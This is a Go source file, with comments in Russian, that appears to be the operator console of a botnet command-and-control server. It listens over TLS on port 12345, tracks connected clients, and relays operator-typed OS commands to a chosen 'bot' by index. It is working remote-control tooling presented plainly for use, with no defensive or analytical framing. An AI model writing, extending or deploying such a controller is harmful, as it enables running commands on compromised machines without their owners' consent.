package main

import (
	"bufio"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
)

var clients []*Client

func main() {
	//server := New("0.0.0.0:12345")
	server := NewWithTLS("0.0.0.0:12345", "server.pem", "server.key")

	// На вход - анонимная функция, обрабатывающая подключение нового клиенат.
	// Допустим, здесь мы шлем клиенту сообщение при подключении.
	server.OnNewClient(func(c *Client) {
		//c.Send("Hello\n")
		fmt.Printf("Attach client [%p]\n", c)
		clients = append(clients, c)
	})

	// На вход - анонимная функция, которая будет дергаться при получении
	// нового сообщения от пользователя.
	server.OnNewMessage(func(c *Client, message string) {
		fmt.Printf("msg[%p]: %s", c, message)
	})

	// На вход - анонимная функция, которая дергается при отключении клиента.
	server.OnClientConnectionClosed(func(c *Client, err error) {
		fmt.Printf("connection lost:[%p] \n", c)
		for key, val := range clients {
			if val == c {
				clients = append(clients[:key], clients[key+1:]...)
				break
			}
		}
	})

	go server.Listen()

	// бесконечно запрашиваем комманды админа
	inputReader := bufio.NewReader(os.Stdin) // ридер байт, который читает из stdin
	for {
		fmt.Println("\n[*] Enter command:")
		cmd, _ := inputReader.ReadString('\n')
		cmdParse(cmd)
	}
}

// Обработка комманд админа
func cmdParse(cmd string) {
	//fmt.Printf("Cmd: %s\n", cmd)
	reCmd := regexp.MustCompile(`^(\d+):`) // приставка, которая означает, что дальше идет комманда для ОС

	if cmd == "ls\n" {
		fmt.Println("===clients===")
		for key, val := range clients {
			fmt.Printf("[%d][%p]\n", key, val)
		}
	} else if cmd == "exit\n" {
		fmt.Println("By-by")
		os.Exit(1)
	} else if reCmd.MatchString(cmd) {
		cmdExec := reCmd.ReplaceAllString(cmd, "") // парсим комманду

		// парсим порядковый номер клиента
		botId := reCmd.FindString(cmd)
		botId = strings.TrimSuffix(botId, ":")
		botID, _ := strconv.Atoi(botId)
        
        if botID < len(clients) {
            // шлем сообщение клиенту
            clients[botID].Send(cmdExec)
        }
	}
}
